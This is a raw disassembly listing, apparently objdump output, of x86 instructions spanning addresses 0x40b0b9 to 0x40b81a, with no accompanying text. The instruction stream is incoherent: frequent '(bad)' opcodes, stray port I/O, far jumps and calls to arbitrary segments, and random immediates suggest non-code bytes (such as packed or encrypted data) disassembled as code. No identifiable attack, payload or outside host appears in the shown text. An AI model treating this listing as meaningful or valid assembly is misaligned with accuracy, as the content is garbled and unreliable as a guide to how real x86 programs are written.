  40b0b9:	sub    BYTE PTR [eiz*1+0x4528cafe],dl
  40b0c0:	push   0xffffffc8
  40b0c2:	and    al,0xb8
  40b0c4:	test   al,0x4a
  40b0c6:	xchg   DWORD PTR [esi+ebp*2],ecx
  40b0c9:	lahf   
  40b0ca:	enter  0x5c,0x60
  40b0ce:	cli    
  40b0cf:	adc    eax,0x6ebb54e5
  40b0d4:	mov    esp,0x5105d6b7
  40b0d9:	jl     0x40b0c3
  40b0db:	and    al,0x86
  40b0dd:	mov    cl,0xa4
  40b0df:	scas   al,BYTE PTR es:[edi]
  40b0e0:	fst    st(0)
  40b0e2:	inc    esp
  40b0e3:	aas    
  40b0e4:	push   ds
  40b0e5:	mov    ds:0xf388d689,eax
  40b0ea:	test   eax,0xa3aa0756
  40b0ef:	and    dl,BYTE PTR [edi+0x77160536]
  40b0f5:	out    0x5f,eax
  40b0f7:	pop    esi
  40b0f8:	loopne 0x40b0f0
  40b0fa:	out    dx,al
  40b0fb:	ret    0x94b4
  40b0fe:	lock pop ds
  40b100:	out    dx,eax
  40b101:	call   0x3089:0x3c006034
  40b108:	and    DWORD PTR [esi+0x78],ecx
  40b10b:	jg     0x40b0c6
  40b10d:	sahf   
  40b10e:	and    al,0x28
  40b110:	or     al,0xe7
  40b112:	jmp    0x4f1181e8
  40b117:	mov    dh,0x4d
  40b119:	retf   0xe2c6
  40b11c:	out    0x6,al
  40b11e:	(bad)  
  40b11f:	scas   eax,DWORD PTR es:[edi]
  40b120:	arpl   WORD PTR [esi],cx
  40b122:	add    al,0x71
  40b124:	jo     0x40b15e
  40b126:	sbb    esi,ecx
  40b128:	pusha  
  40b129:	jle    0x40b0ca
  40b12b:	mov    eax,ds:0xfa848b84
  40b130:	clc    
  40b131:	inc    eax
  40b132:	pop    esp
  40b133:	and    eax,0x6a82acaf
  40b138:	sbb    edi,0xb039ec91
  40b13e:	(bad)  
  40b13f:	neg    BYTE PTR [edx+0x3342e23e]
  40b145:	stc    
  40b146:	jl     0x40b178
  40b148:	stc    
  40b149:	in     eax,0xa0
  40b14b:	or     BYTE PTR [ecx+ebp*1+0xec3b318],ch
  40b152:	and    ch,BYTE PTR [ebx-0x6e]
  40b155:	sub    esp,ebx
  40b157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b158:	(bad)  
  40b159:	sti    
  40b15a:	or     bl,BYTE PTR [ebx]
  40b15c:	rcl    DWORD PTR [ecx],cl
  40b15e:	and    DWORD PTR [edi],edi
  40b160:	adc    dh,BYTE PTR [esi]
  40b162:	sbb    bh,BYTE PTR [ecx+0x7]
  40b165:	xor    DWORD PTR [edi+ebp*4-0x55],ebx
  40b169:	inc    ebp
  40b16a:	or     al,0xf3
  40b16c:	mov    cl,0xa5
  40b16e:	gs jne 0x40b1d6
  40b171:	addr16 cmp al,0x7f
  40b174:	scas   eax,DWORD PTR es:[edi]
  40b175:	int3   
  40b176:	or     eax,0x10a641d5
  40b17b:	test   al,0x3b
  40b17d:	lds    esi,FWORD PTR gs:[esi-0x2c]
  40b181:	loope  0x40b123
  40b183:	inc    eax
  40b184:	add    esi,DWORD PTR [esi-0x7be6154b]
  40b18a:	dec    esp
  40b18b:	je     0x40b185
  40b18d:	(bad)  
  40b18e:	call   0x7d54:0xdc00fc89
  40b195:	jae    0x40b184
  40b197:	xchg   esi,eax
  40b198:	dec    ebx
  40b199:	xor    DWORD PTR [ebx],edx
  40b19b:	inc    esp
  40b19c:	add    al,0x73
  40b19e:	or     bl,ah
  40b1a0:	cmc    
  40b1a1:	iret   
  40b1a2:	sub    eax,0x630e950a
  40b1a7:	loop   0x40b1e2
  40b1a9:	or     eax,0xa68cf9b8
  40b1ae:	bndstx [edi+ebx*1],bnd0
  40b1b2:	pop    ebp
  40b1b3:	pop    ebp
  40b1b4:	dec    ebx
  40b1b5:	les    esp,FWORD PTR [edi-0x70]
  40b1b8:	push   0x312c1e20
  40b1bd:	fstp   QWORD PTR [eax+0x7ec70fa2]
  40b1c3:	in     al,0x12
  40b1c5:	xor    eax,0x8c65273d
  40b1ca:	jmp    0xc08ed098
  40b1cf:	push   0xd7fd54d6
  40b1d4:	dec    esi
  40b1d5:	mov    ebx,0xb90d4699
  40b1da:	out    dx,eax
  40b1db:	sbb    eax,0x6f658223
  40b1e0:	ins    DWORD PTR es:[edi],dx
  40b1e1:	cmp    BYTE PTR [ecx],dl
  40b1e3:	mov    esp,0xc8d098cd
  40b1e8:	shl    BYTE PTR [edx-0x5d],cl
  40b1eb:	test   BYTE PTR [ecx-0x77],dh
  40b1ee:	push   ebx
  40b1ef:	jp     0x40b1fe
  40b1f1:	mov    esp,0xb566b4c3
  40b1f6:	jae    0x40b1a2
  40b1f8:	shl    DWORD PTR [esi-0x75],0xef
  40b1fc:	push   ebp
  40b1fd:	lods   al,BYTE PTR ds:[esi]
  40b1fe:	cmp    eax,DWORD PTR [eax-0x2dfb921e]
  40b204:	loop   0x40b266
  40b206:	push   esi
  40b207:	mov    esp,0xe7551b5c
  40b20c:	jno    0x40b1a0
  40b20e:	sbb    bh,BYTE PTR [edx+ecx*8-0x6c]
  40b212:	mov    bh,0xe8
  40b214:	mov    esi,0x3017723e
  40b219:	push   edx
  40b21a:	mov    al,ds:0x5f5fbadc
  40b21f:	mov    ebp,0x38aef1ef
  40b224:	cmp    al,0xe7
  40b226:	nop
  40b227:	jecxz  0x40b25f
  40b229:	test   BYTE PTR [esi+ebx*2],bl
  40b22c:	pop    edi
  40b22d:	push   esp
  40b22e:	jle    0x40b23b
  40b230:	icebp  
  40b231:	outs   dx,BYTE PTR ds:[esi]
  40b232:	std    
  40b233:	ja     0x40b2b0
  40b235:	ss mov bh,0x6d
  40b238:	test   eax,0x8378e866
  40b23d:	(bad)  [edx-0x15]
  40b240:	popa   
  40b241:	push   ecx
  40b242:	adc    esp,eax
  40b244:	pop    esi
  40b245:	mov    esi,0x897eb760
  40b24a:	push   ds
  40b24b:	cmc    
  40b24c:	scas   eax,DWORD PTR es:[edi]
  40b24d:	(bad)  [esi]
  40b24f:	mov    eax,ds:0xbeb2a9c7
  40b254:	xchg   edi,eax
  40b255:	mov    eax,0x5017c259
  40b25a:	push   ss
  40b25b:	ss push 0xdcb4e4d9
  40b261:	lahf   
  40b262:	or     DWORD PTR [ebx-0x48],edx
  40b265:	or     ch,ch
  40b267:	and    al,0x3
  40b269:	shr    BYTE PTR [ebp+ebx*4-0x23],1
  40b26d:	or     BYTE PTR [ebx+0x27cda49f],al
  40b273:	inc    esp
  40b274:	mov    ecx,0x62e4dd6
  40b279:	pop    eax
  40b27a:	lods   eax,DWORD PTR ds:[esi]
  40b27b:	cmp    bl,0xc6
  40b27e:	mov    ah,0xbe
  40b280:	fidivr WORD PTR [esi-0x54]
  40b283:	add    al,0x75
  40b285:	push   ebx
  40b286:	dec    eax
  40b287:	cmp    DWORD PTR [edi+0x3e],eax
  40b28a:	xchg   ebp,eax
  40b28b:	ds stos DWORD PTR es:[edi],eax
  40b28d:	lods   al,BYTE PTR ds:[esi]
  40b28e:	push   cs
  40b28f:	jmp    0xc4fe:0x42f17a6f
  40b296:	cmp    bh,BYTE PTR [ebp-0x329cf73c]
  40b29c:	div    BYTE PTR [ecx-0x65e655df]
  40b2a2:	out    0x51,al
  40b2a4:	pop    ds
  40b2a5:	mov    cl,al
  40b2a7:	sbb    al,0x84
  40b2a9:	scas   al,BYTE PTR es:[edi]
  40b2aa:	(bad)  
  40b2ab:	cmp    cl,BYTE PTR [edx]
  40b2ad:	out    dx,al
  40b2ae:	loop   0x40b274
  40b2b0:	stos   BYTE PTR es:[edi],al
  40b2b1:	xor    esp,DWORD PTR [ebx]
  40b2b3:	test   eax,0xd9566451
  40b2b8:	mov    eax,ds:0x25ffd57b
  40b2bd:	or     BYTE PTR [ebp*1-0xd809504],ch
  40b2c4:	rcr    DWORD PTR [edi+0x77ee6dbc],1
  40b2ca:	jl     0x40b307
  40b2cc:	or     cl,ah
  40b2ce:	iret   
  40b2cf:	sahf   
  40b2d0:	aas    
  40b2d1:	nop
  40b2d2:	mov    ecx,0xefdcad51
  40b2d7:	arpl   WORD PTR [edx-0x6a],bp
  40b2da:	xor    eax,0x36b64dbf
  40b2df:	and    DWORD PTR [ecx-0x7c587d90],ecx
  40b2e5:	and    DWORD PTR [esi],ebx
  40b2e7:	xor    dh,dh
  40b2e9:	(bad)  
  40b2ea:	retf   0x5042
  40b2ed:	jl     0x40b26f
  40b2ef:	xchg   ecx,ebx
  40b2f1:	adc    al,0x6d
  40b2f3:	and    al,0xea
  40b2f5:	aaa    
  40b2f6:	ret    
  40b2f7:	push   ss
  40b2f8:	dec    esp
  40b2f9:	mov    edx,0x802d89
  40b2fe:	sbb    ecx,DWORD PTR [eax]
  40b300:	ret    0x94a1
  40b303:	shl    BYTE PTR [edx],1
  40b305:	and    edi,ebp
  40b307:	les    esp,FWORD PTR [eax]
  40b309:	dec    eax
  40b30a:	adc    DWORD PTR cs:[eax-0x25],0xd592ed0b
  40b312:	xlat   BYTE PTR ds:[ebx]
  40b313:	pop    ss
  40b314:	(bad)  
  40b315:	fldcw  WORD PTR [eax+eiz*1-0x7a36e9]
  40b31c:	pop    es
  40b31d:	mov    al,ds:0xf0b49703
  40b322:	(bad)  
  40b323:	popf   
  40b324:	mov    ds:0x235849da,eax
  40b329:	cmp    dh,BYTE PTR [esi-0x183032b8]
  40b32f:	push   eax
  40b330:	push   edx
  40b331:	clc    
  40b332:	jmp    0xf85a:0x6742777b
  40b339:	add    al,BYTE PTR [eax+eax*2-0x2c]
  40b33d:	popa   
  40b33e:	jg     0x40b342
  40b340:	ins    BYTE PTR es:[edi],dx
  40b341:	arpl   WORD PTR [edx+0x6f],di
  40b344:	jl     0x40b30a
  40b346:	mov    ds:0x7a87e009,eax
  40b34b:	xchg   DWORD PTR [esi-0x680b4ed6],ebp
  40b351:	dec    edx
  40b352:	stc    
  40b353:	sbb    DWORD PTR [edi+0x293739f0],esi
  40b359:	xor    eax,ebx
  40b35b:	mov    WORD PTR [eax+0x294fca8],?
  40b361:	sbb    al,0x42
  40b363:	dec    ebx
  40b364:	jmp    0x674f4c76
  40b369:	adc    eax,0x70aff1f4
  40b36e:	sbb    eax,0x1b665d9e
  40b373:	mov    bh,0xb9
  40b375:	sbb    eax,0x353db03d
  40b37a:	sub    DWORD PTR [edi-0x44],ecx
  40b37d:	pop    ecx
  40b37e:	xor    eax,0xe4254598
  40b383:	xor    esi,esi
  40b385:	push   ebp
  40b386:	fucom  st(7)
  40b388:	cmp    BYTE PTR [eax+0x28],cl
  40b38b:	dec    ecx
  40b38c:	aad    0xb4
  40b38e:	jns    0x40b318
  40b390:	adc    cl,dl
  40b392:	dec    ebx
  40b393:	cmp    edx,esi
  40b395:	push   ebp
  40b396:	adc    al,0x99
  40b398:	dec    edi
  40b399:	movaps xmm3,XMMWORD PTR [eax-0x41]
  40b39d:	jbe    0x40b391
  40b39f:	and    DWORD PTR [esi+0x6],ecx
  40b3a2:	out    dx,eax
  40b3a3:	adc    edi,DWORD PTR [edi-0x5c52ebab]
  40b3a9:	leave  
  40b3aa:	scas   al,BYTE PTR es:[edi]
  40b3ab:	add    BYTE PTR [ebx],0x8c
  40b3ae:	mov    bh,0x91
  40b3b0:	ds dec edi
  40b3b2:	(bad)  
  40b3b4:	pushf  
  40b3b5:	pop    ebx
  40b3b6:	sub    edi,DWORD PTR [eax]
  40b3b8:	repz loope 0x40b3ae
  40b3bb:	cmp    al,BYTE PTR [esi+0x4b]
  40b3be:	push   eax
  40b3bf:	sbb    eax,ebx
  40b3c1:	(bad)  
  40b3c2:	add    DWORD PTR [edi+0x51],esp
  40b3c5:	xchg   ebp,eax
  40b3c6:	mov    esp,0x698fae32
  40b3cb:	mov    WORD PTR [edi+0x2c],cs
  40b3ce:	scas   eax,DWORD PTR es:[edi]
  40b3cf:	and    al,0x1c
  40b3d1:	iret   
  40b3d2:	inc    ebx
  40b3d3:	xchg   ebx,eax
  40b3d4:	or     bh,bl
  40b3d6:	cli    
  40b3d7:	mov    dh,0xf6
  40b3d9:	cli    
  40b3da:	jo     0x40b3c8
  40b3dc:	mov    esi,DWORD PTR [esp+ecx*2+0xe1a7de3]
  40b3e3:	inc    ecx
  40b3e4:	inc    ebx
  40b3e5:	sbb    eax,0x7de2404b
  40b3ea:	bound  esi,QWORD PTR [eax+0x228b813]
  40b3f0:	pushf  
  40b3f1:	cmp    eax,0x2ea8fa8a
  40b3f6:	add    al,0x2e
  40b3f8:	mov    gs,WORD PTR [esi+0x10]
  40b3fb:	js     0x40b42f
  40b3fd:	aas    
  40b3fe:	rcr    ecx,1
  40b400:	add    esp,DWORD PTR [ecx-0x51a7115]
  40b406:	(bad)  
  40b408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b409:	out    0x91,eax
  40b40b:	or     BYTE PTR [ebx+0x56],dl
  40b40e:	push   edi
  40b40f:	(bad)
  40b413:	and    cl,BYTE PTR [esi+0xb]
  40b416:	sub    DWORD PTR [ebx-0x5],esi
  40b419:	jmp    0x16a52376
  40b41e:	and    DWORD PTR [esp+ebx*1+0x50],eax
  40b422:	push   ds
  40b423:	xlat   BYTE PTR ds:[ebx]
  40b424:	mov    eax,0x56bcbd81
  40b429:	ins    BYTE PTR es:[edi],dx
  40b42a:	rcl    DWORD PTR es:[ebp+edx*8-0x1c1d6072],cl
  40b432:	inc    ebx
  40b433:	inc    edx
  40b434:	ret    0x1035
  40b437:	pop    ebp
  40b438:	xlat   BYTE PTR ds:[ebx]
  40b439:	push   esp
  40b43a:	outs   dx,DWORD PTR ds:[esi]
  40b43b:	inc    edi
  40b43c:	aam    0x24
  40b43e:	jns    0x40b4a6
  40b440:	ss (bad) 
  40b442:	mov    DWORD PTR [eax],esp
  40b444:	rcr    ebx,cl
  40b446:	mov    ebp,0x90115a1d
  40b44b:	mov    cl,0xec
  40b44d:	jne    0x40b427
  40b44f:	push   ebx
  40b450:	mov    eax,0x716c3a72
  40b455:	xchg   DWORD PTR [ebx+0x65],esp
  40b458:	inc    esp
  40b459:	sbb    esi,DWORD PTR [edx-0xc8c3b58]
  40b45f:	jae    0x40b3f9
  40b461:	scas   al,BYTE PTR es:[edi]
  40b462:	adc    ecx,ebp
  40b464:	mov    bl,0x69
  40b466:	sahf   
  40b467:	push   cs
  40b468:	lds    ebp,FWORD PTR [ebx-0x571d0be5]
  40b46e:	inc    ebp
  40b46f:	cmc    
  40b470:	xchg   edi,eax
  40b471:	jne    0x40b43a
  40b473:	jbe    0x40b4db
  40b475:	sub    al,0x59
  40b477:	or     al,0xae
  40b479:	push   ds
  40b47a:	(bad)  
  40b47b:	js     0x40b400
  40b47d:	je     0x40b47c
  40b47f:	jne    0x40b469
  40b481:	xchg   edi,eax
  40b482:	xor    dh,BYTE PTR [edi-0x4cba5360]
  40b488:	push   ebp
  40b489:	mov    DWORD PTR [esi-0x2b665aaa],ebx
  40b48f:	and    cl,BYTE PTR [eax]
  40b491:	enter  0x3446,0xbe
  40b495:	(bad)  
  40b496:	fcmovbe st,st(1)
  40b498:	fistp  DWORD PTR [edi+0x36]
  40b49b:	sahf   
  40b49c:	xor    edi,esp
  40b49e:	mov    esp,0xa4a1e096
  40b4a3:	(bad)  
  40b4a4:	pop    ecx
  40b4a5:	mov    al,0xd4
  40b4a7:	sbb    esp,DWORD PTR [ecx-0x66]
  40b4aa:	xor    al,bh
  40b4ac:	fnsave [esi]
  40b4ae:	jne    0x40b515
  40b4b0:	bound  ebx,QWORD PTR ds:0xb1c9d44f
  40b4b6:	dec    edx
  40b4b7:	mov    esi,0x3c34511a
  40b4bc:	out    dx,al
  40b4bd:	stos   DWORD PTR es:[edi],eax
  40b4be:	push   ecx
  40b4bf:	cmp    ecx,edi
  40b4c1:	rol    BYTE PTR [ebp-0x29d3ed22],cl
  40b4c7:	xchg   esi,eax
  40b4c8:	xchg   esp,eax
  40b4c9:	pop    eax
  40b4ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4cb:	jmp    0x40b45a
  40b4cd:	pop    ebp
  40b4ce:	test   DWORD PTR [ecx+edx*8-0x7a04e6e4],ebx
  40b4d5:	lea    ebp,[ebp-0x7d2f678b]
  40b4db:	mov    bl,0x9f
  40b4dd:	mov    es,WORD PTR [esi+0x76]
  40b4e0:	sahf   
  40b4e1:	rol    esp,1
  40b4e3:	jge    0x9d95
  40b4e8:	add    dh,BYTE PTR [eax-0x10ba9314]
  40b4ee:	dec    edi
  40b4ef:	or     bh,BYTE PTR es:[ebx]
  40b4f2:	or     al,0x21
  40b4f4:	fld    st(4)
  40b4f7:	rol    BYTE PTR [ebp-0x456aa575],1
  40b4fd:	and    eax,ecx
  40b4ff:	ins    DWORD PTR es:[edi],dx
  40b500:	stos   DWORD PTR es:[edi],eax
  40b501:	pusha  
  40b502:	je     0x40b484
  40b504:	and    al,0x85
  40b506:	xlat   BYTE PTR ds:[ebx]
  40b507:	sub    al,0x3f
  40b50a:	jne    0x40b4fe
  40b50c:	repnz fadd st,st(2)
  40b50f:	jle    0x40b572
  40b511:	jb     0x40b50a
  40b513:	push   ss
  40b514:	imul   ecx,DWORD PTR es:[ebx+ebp*8+0x6],0x873cb1d6
  40b51d:	(bad)  
  40b520:	mov    al,ds:0x650014af
  40b525:	dec    eax
  40b526:	adc    DWORD PTR [ecx+0x72e4a08],eax
  40b52c:	repnz (bad) 
  40b52e:	out    dx,eax
  40b52f:	xchg   ecx,eax
  40b530:	sbb    BYTE PTR [ebp+0x6a],0xa8
  40b534:	push   edx
  40b535:	add    DWORD PTR [eax],0xffffff8f
  40b538:	das    
  40b539:	in     al,dx
  40b53a:	shl    BYTE PTR [esi+0x19168314],0xe
  40b541:	push   DWORD PTR [ebp+0x68]
  40b544:	out    0xd5,al
  40b546:	adc    ax,0x7a85
  40b54a:	aas    
  40b54b:	aaa    
  40b54c:	push   eax
  40b54d:	inc    eax
  40b54e:	stc    
  40b54f:	sbb    BYTE PTR [ecx-0x692e0cf1],0x4e
  40b556:	dec    edi
  40b557:	mov    al,cl
  40b559:	lahf   
  40b55a:	inc    eax
  40b55b:	or     BYTE PTR [ecx-0xb],ah
  40b55e:	out    dx,al
  40b55f:	dec    ebx
  40b560:	scas   eax,DWORD PTR es:[edi]
  40b561:	add    ebx,ebx
  40b563:	sub    BYTE PTR [ebx+0x3af68978],ah
  40b569:	gs cdq 
  40b56b:	mov    BYTE PTR [esi+ecx*1+0x2898b5cd],ah
  40b572:	(bad)  
  40b573:	adc    ebx,DWORD PTR [eax+edi*2+0x5b]
  40b577:	dec    eax
  40b578:	and    ebx,ebp
  40b57a:	dec    eax
  40b57b:	mov    edi,DWORD PTR [ebx+0x29]
  40b57e:	xchg   ebx,eax
  40b57f:	inc    esi
  40b580:	mov    ds:0x197413fa,eax
  40b585:	lods   eax,DWORD PTR ds:[esi]
  40b586:	cmp    cl,ah
  40b588:	ds js  0x40b5e9
  40b58b:	pop    ebx
  40b58c:	xchg   ebp,eax
  40b58d:	pop    ecx
  40b58e:	std    
  40b58f:	mov    ebx,DWORD PTR [ebx-0x248e509c]
  40b595:	out    dx,eax
  40b596:	cld    
  40b597:	add    edx,DWORD PTR [edi-0x3cb86763]
  40b59d:	pop    ebp
  40b59e:	popf   
  40b59f:	adc    BYTE PTR [ebp+0x2d424d92],bh
  40b5a5:	enter  0x3916,0xc4
  40b5a9:	jmp    0x40b5fa
  40b5ab:	xor    bl,cl
  40b5ad:	mov    ebx,0x250f3db
  40b5b2:	call   0x63e5:0x1c621c14
  40b5b9:	or     DWORD PTR [esi],edi
  40b5bb:	xor    ebp,ecx
  40b5bd:	aam    0xc5
  40b5bf:	or     al,0x63
  40b5c1:	push   ds
  40b5c2:	add    DWORD PTR [ebx*2-0x4a193eef],ecx
  40b5c9:	jb     0x40b54f
  40b5cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5cc:	jmp    0xd445:0x545030a4
  40b5d3:	pop    ss
  40b5d4:	and    eax,0xf34ad218
  40b5d9:	mov    ch,0x3c
  40b5db:	sub    DWORD PTR [ecx+edx*4+0x1f],edi
  40b5df:	xchg   ebx,eax
  40b5e0:	dec    ebx
  40b5e1:	mov    dh,0xc
  40b5e3:	inc    ebp
  40b5e4:	(bad)  
  40b5e6:	cmp    eax,0x5bc10c8a
  40b5eb:	ins    BYTE PTR es:[edi],dx
  40b5ec:	cld    
  40b5ed:	cvtps2pi mm7,QWORD PTR [ebx-0x2]
  40b5f1:	bound  eax,QWORD PTR [esi-0x62]
  40b5f4:	sub    DWORD PTR [esi+0x4a],esp
  40b5f7:	push   edx
  40b5f8:	sub    eax,0x1e084373
  40b5fd:	push   esi
  40b5fe:	fild   DWORD PTR [ecx]
  40b600:	enter  0x61b6,0x92
  40b604:	adc    cl,BYTE PTR [eax+0x68ec8aec]
  40b60a:	push   edi
  40b60b:	in     al,0x14
  40b60d:	in     al,0xed
  40b60f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b610:	push   ebp
  40b611:	and    ebp,ebp
  40b613:	sub    al,0xda
  40b615:	bound  edi,QWORD PTR [ebx-0xc]
  40b618:	jno    0x40b662
  40b61a:	repz rol ch,cl
  40b61d:	outs   dx,BYTE PTR ds:[esi]
  40b61e:	paddb  mm2,QWORD PTR [ebx+0x52a812f1]
  40b625:	dec    ebx
  40b626:	jg     0x40b64c
  40b628:	(bad)  
  40b629:	in     al,dx
  40b62a:	mov    bh,0x9c
  40b62c:	lock and al,0x99
  40b62f:	ins    DWORD PTR es:[edi],dx
  40b630:	push   ds
  40b631:	push   ebx
  40b632:	xlat   BYTE PTR ds:[ebx]
  40b633:	mov    WORD PTR [esi],gs
  40b635:	les    eax,FWORD PTR [eax-0x38]
  40b638:	aas    
  40b639:	or     esi,DWORD PTR [edx]
  40b63b:	jae    0x40b5f1
  40b63d:	mov    BYTE PTR [ecx],0x3e
  40b640:	sahf   
  40b641:	xor    DWORD PTR [esp+ebx*2],ecx
  40b644:	fstp   QWORD PTR [edi+0x4322ac9c]
  40b64a:	test   al,0x8f
  40b64c:	lds    edx,FWORD PTR [edi-0x5e64113e]
  40b652:	out    dx,eax
  40b653:	stos   BYTE PTR es:[edi],al
  40b654:	jne    0x40b630
  40b656:	and    BYTE PTR [edx+0x74],cl
  40b659:	mov    al,ds:0x68e53031
  40b65e:	inc    esp
  40b65f:	dec    edx
  40b660:	das    
  40b661:	inc    esi
  40b662:	dec    edx
  40b663:	shl    BYTE PTR [esi+0x4a],cl
  40b666:	pop    esp
  40b667:	mov    bl,0x28
  40b669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b66a:	mov    ch,0x53
  40b66c:	test   al,0x58
  40b66e:	mov    ecx,DWORD PTR [edx]
  40b670:	add    BYTE PTR ds:0xa6c8a5b3,dh
  40b676:	xor    bh,BYTE PTR [eax]
  40b678:	shl    DWORD PTR [edx+0x39af1cbf],cl
  40b67e:	mov    bh,0x2
  40b680:	sub    ecx,DWORD PTR [ecx+0x7d]
  40b683:	sub    edi,0x10
  40b686:	sar    DWORD PTR [esp+ecx*8],0x80
  40b68a:	push   es
  40b68b:	out    dx,eax
  40b68c:	add    edx,ecx
  40b68e:	ins    DWORD PTR es:[edi],dx
  40b68f:	add    eax,0x933e6688
  40b694:	aad    0x84
  40b696:	and    cl,ch
  40b698:	jg     0x40b6d4
  40b69a:	or     dh,bh
  40b69c:	inc    edx
  40b69d:	loop   0x40b6f3
  40b69f:	cdq    
  40b6a0:	mov    edi,0x63607806
  40b6a5:	push   cs
  40b6a6:	push   edi
  40b6a7:	out    dx,al
  40b6a8:	inc    BYTE PTR [eax+0x64]
  40b6ab:	enter  0xe533,0xcb
  40b6af:	in     eax,0x8b
  40b6b1:	xchg   esi,eax
  40b6b2:	mov    edi,0xef791ecd
  40b6b7:	das    
  40b6b8:	inc    ebx
  40b6b9:	shl    ah,1
  40b6bb:	fcmovbe st,st(2)
  40b6bd:	push   edx
  40b6be:	sbb    al,0xb
  40b6c0:	mov    edi,0x8d4f7ebb
  40b6c5:	adc    ah,bl
  40b6c7:	dec    ebx
  40b6c8:	aas    
  40b6c9:	bound  esi,QWORD PTR [ebx+ecx*8+0x337ff56]
  40b6d0:	test   BYTE PTR [esi+0x8],0xb5
  40b6d4:	xchg   esp,eax
  40b6d5:	std    
  40b6d6:	out    dx,eax
  40b6d7:	add    eax,0xb28ece11
  40b6dc:	mov    ds:0xaf456035,al
  40b6e1:	jmp    0x8df43637
  40b6e6:	in     eax,dx
  40b6e7:	push   0xffffffcb
  40b6e9:	push   edx
  40b6ea:	xchg   ecx,eax
  40b6eb:	cmp    BYTE PTR [ecx],bl
  40b6ed:	inc    edx
  40b6ee:	xchg   edx,eax
  40b6ef:	sbb    DWORD PTR [ecx],esi
  40b6f1:	mov    ?,WORD PTR [eax]
  40b6f3:	cli    
  40b6f4:	out    0xdd,al
  40b6f6:	pop    eax
  40b6f7:	cdq    
  40b6f8:	arpl   WORD PTR [edx],sp
  40b6fa:	out    0x9,al
  40b6fc:	push   ds
  40b6fd:	mov    ds:0x5831526b,eax
  40b702:	call   0x5dface9d
  40b707:	js     0x40b694
  40b709:	jbe    0x40b76c
  40b70b:	add    BYTE PTR [esi],al
  40b70d:	jns    0x40b6fe
  40b70f:	mov    bl,0x71
  40b711:	fdivr  st,st(3)
  40b713:	sbb    cl,BYTE PTR [ebx]
  40b715:	stos   BYTE PTR es:[edi],al
  40b716:	xor    BYTE PTR [ebp-0x32],ch
  40b719:	adc    eax,0xaf013cb9
  40b71e:	inc    esp
  40b71f:	test   DWORD PTR [esi+ebx*4-0x44f406b6],esi
  40b726:	idiv   DWORD PTR [ebx-0x3e]
  40b729:	mov    cl,0xf8
  40b72b:	cs dec edi
  40b72d:	arpl   WORD PTR [edx],ax
  40b72f:	push   edi
  40b730:	adc    esi,edi
  40b732:	(bad)  
  40b733:	loope  0x40b726
  40b735:	pop    edx
  40b736:	pushf  
  40b737:	test   BYTE PTR [esi],ah
  40b739:	sbb    al,BYTE PTR [esi]
  40b73b:	mov    ch,0xa4
  40b73d:	add    al,0xe8
  40b73f:	(bad)  
  40b740:	mov    dl,0xa0
  40b742:	mov    cl,0x76
  40b744:	ret    
  40b745:	(bad)
  40b748:	dec    ebp
  40b749:	addr16 xchg ebp,eax
  40b74b:	add    cl,BYTE PTR [esp+edx*4]
  40b74e:	inc    esp
  40b74f:	js     0x40b72e
  40b751:	dec    esp
  40b752:	mov    WORD PTR [ebp-0x26953886],?
  40b758:	stos   DWORD PTR es:[edi],eax
  40b759:	cwde   
  40b75a:	add    ecx,eax
  40b75c:	imul   bl
  40b75e:	mov    ah,BYTE PTR [esi-0x67]
  40b761:	rcl    BYTE PTR [edx-0x12],0x1d
  40b765:	je     0x40b742
  40b767:	sbb    al,0x1e
  40b769:	and    eax,0xe386b906
  40b76e:	or     DWORD PTR [ebx+0x46],ecx
  40b771:	xchg   BYTE PTR [ebx],ah
  40b773:	outs   dx,DWORD PTR ds:[esi]
  40b774:	dec    ebp
  40b775:	sub    al,0x84
  40b777:	sbb    BYTE PTR [edi],dh
  40b779:	lock mov ch,0x11
  40b77c:	mov    ah,0xc9
  40b77e:	inc    esi
  40b77f:	arpl   WORD PTR [bp-0x53],si
  40b783:	stos   BYTE PTR es:[edi],al
  40b784:	loopne 0x40b724
  40b786:	mov    esi,DWORD PTR [edx-0x511e1f7e]
  40b78c:	mov    ecx,0x14c7df89
  40b791:	dec    edx
  40b792:	mov    ?,WORD PTR [ebp+0x50]
  40b795:	or     cl,BYTE PTR [ecx+edi*1+0x62]
  40b799:	lods   al,BYTE PTR ds:[esi]
  40b79a:	fld    DWORD PTR [edi+ecx*2-0x4e3faebe]
  40b7a1:	loope  0x40b76f
  40b7a3:	loopne 0x40b7b0
  40b7a5:	jge    0x40b7a0
  40b7a7:	cmc    
  40b7a8:	push   ebp
  40b7a9:	repz fidivr DWORD PTR ds:0xb26faeb5
  40b7b0:	xchg   BYTE PTR [edx],dh
  40b7b2:	outs   dx,BYTE PTR ds:[esi]
  40b7b3:	stc    
  40b7b4:	fwait
  40b7b5:	jle    0x40b7f3
  40b7b7:	inc    ecx
  40b7b8:	ss out 0xdb,al
  40b7bb:	mov    cl,0x83
  40b7bd:	sub    eax,0x4883deb5
  40b7c2:	or     eax,0x14415602
  40b7c7:	ds add al,0x10
  40b7ca:	mov    WORD PTR [ebp-0x9],ds
  40b7cd:	push   ecx
  40b7ce:	mov    bh,0x13
  40b7d0:	leave  
  40b7d1:	in     al,0x16
  40b7d3:	sub    ebp,esp
  40b7d5:	mov    ds:0x6cc13b65,eax
  40b7da:	mov    edi,0xd1f5879c
  40b7df:	mov    dl,0x7d
  40b7e1:	pop    edi
  40b7e2:	test   DWORD PTR [edi+0x30],ecx
  40b7e5:	fcom   QWORD PTR [eax+0x75]
  40b7e8:	or     DWORD PTR [esi+0x65eceb32],esp
  40b7ee:	pushf  
  40b7ef:	stos   BYTE PTR es:[edi],al
  40b7f0:	cmp    BYTE PTR [eax-0x58],dh
  40b7f3:	xchg   edi,eax
  40b7f4:	jno    0x40b823
  40b7f6:	add    DWORD PTR [ebp+ecx*2-0x7bcb76d5],ebx
  40b7fd:	stc    
  40b7fe:	retf   
  40b7ff:	cwde   
  40b800:	jl     0x40b878
  40b802:	rol    BYTE PTR [edx],0x2c
  40b805:	sbb    eax,0x36fabdcf
  40b80a:	shr    BYTE PTR [edi+0x55],0x78
  40b80e:	rol    BYTE PTR [ecx-0x26],0x94
  40b812:	imul   esi,DWORD PTR [ebp+0x41],0xffffffc1
  40b816:	aad    0x95
  40b818:	aad    0x1d
  40b81a:	ret    0x3761
